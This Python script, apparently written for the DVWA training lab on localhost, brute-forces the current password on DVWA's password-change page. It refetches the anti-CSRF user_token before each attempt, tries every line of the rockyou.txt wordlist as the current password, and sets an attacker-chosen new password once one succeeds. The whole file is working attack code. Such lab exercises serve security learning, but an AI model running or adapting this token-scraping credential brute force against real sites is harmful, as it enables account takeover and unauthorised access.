import requests
import re

baseUrl = "http://localhost/DVWA/vulnerabilities/csrf/"

cookies = {
    "PHPSESSID": "ad7fffbc75ab11d8a9fb89ec82bb5607",
    "security": "impossible"
}

pattern = r"name='user_token' value='([a-fA-F0-9]+)'"

def getCSRFToken():
    try:
        # Take CSRF Token
        res = requests.get(baseUrl, cookies=cookies)

        match = re.search(pattern, res.text)
        if match:
            token = match.group(1)
            
            return token
        else:
            print("Failed to taken token")
            return False
    except requests.exceptions.RequestException as e:
        print("Request error:", e)

def changePassword():
    newPassword = input('Enter new password: ')

    headers = {
        "Referer": "http://localhost/DVWA/vulnerabilities/csrf/"
    }

    try:    
        with open('/usr/share/wordlists/rockyou.txt') as file:
            for line in file:
                password = line.rstrip()
                
                user_token = getCSRFToken()

                if not user_token:
                    print('Failed to fetch token')
                    continue
                

                url = baseUrl + f"?password_current={password}&password_new={newPassword}&password_conf={newPassword}&Change=Change&user_token={user_token}"

                try:
                    print(f'Attempting {password}')
                    res = requests.get(url, cookies=cookies, headers=headers)

                    if "Password Changed" in res.text:
                        print()
                        print(f'Found current password: {password}')
                        print('Successfully change password')
                        exit()
                except requests.exceptions.RequestException as e:
                    print("Request error:", e)
    except FileNotFoundError as e:
        print("File not found:", e)

changePassword()